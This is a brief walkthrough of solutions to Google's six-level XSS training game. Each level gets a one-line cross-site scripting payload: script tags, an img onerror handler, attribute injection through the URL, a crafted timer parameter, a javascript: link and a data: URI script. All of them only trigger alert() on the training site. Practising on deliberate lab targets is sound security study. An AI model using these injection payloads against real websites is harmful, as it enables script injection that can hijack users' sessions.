# XSS Game Google
Solution to the six XSS issues proposed by Google

## [1/6]  Level 1: Hello, world of XSS
_Solution_: put `<script>alert('xss');</script>` into form field

## [2/6]  Level 2: Persistence is key
_Solution_: share status `<img src="#" onerror="javascript:alert(1)"/>`

## [3/6]  Level 3: That sinking feeling...
_Solution_: add to url the code: `#1' onerror='alert("xss")'`

## [4/6]  Level 4: Context matters
_Solution_: put this url: `http://xss-game.appspot.com/level4/frame?timer=3')%3Balert('xss`

## [5/6]  Level 5: Breaking protocol
_Solution_: change the href link with: `javascript:alert('xss');` 

## [6/6]  Level 6: Follow the rabbit
_Solution_: add `data://text/javascript.alert('xss');` instead `/static/gadget.js`